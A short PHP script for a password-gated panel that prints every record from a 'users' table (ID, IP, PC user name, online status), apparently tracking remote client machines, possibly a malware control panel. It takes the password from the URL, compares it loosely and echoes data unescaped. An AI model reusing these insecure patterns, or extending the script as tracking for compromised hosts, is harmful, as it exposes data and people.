<?php
include 'classes/sql.php';
include 'classes/configs/config.php';
$password = $_GET['password'];
if($password == $Panel_password)
{
    $sql = 'SELECT * FROM `users`';

    $result = mysqli_query($link, $sql);

    while ($row = mysqli_fetch_array($result)) {
        echo 'ID: '.$row['id'].' , IP: '.$row['ip'].' , User Name: '.$row['PC_user'].' , Online: '.$row['online'].'<br/>';
    }
}
else
{
    echo 'password error!';
}